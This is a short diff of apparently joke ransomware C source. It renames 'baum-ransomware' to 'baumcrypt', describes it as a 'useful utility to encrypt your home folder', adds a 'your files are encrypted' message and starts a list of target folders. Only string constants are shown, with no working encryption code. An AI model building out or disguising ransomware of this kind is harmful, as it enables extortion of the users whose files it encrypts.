@@ -20,13 +20,14 @@ limitations under the License.
 #include <stdio.h>
 
 const char *PROGRAM_NAME =
-	"baum-ransomware 1.0";
+	"baumcrypt 1.0";
 
 const char *PROGRAM_DESC =
 	"useful utility to encrypt your home folder Kappa";
 
-const char *PAYMENT_INFO =
-	"YoU hAvE bEeN hAx0Rd :DD\n";
+const char *PRINT_INFO =
+	"YoU hAvE bEeN hAx0Rd :DD\n"
+	"your files are encrypted\n";
 
 const char *DIRECTORIES[] = {
 	"Desktop",
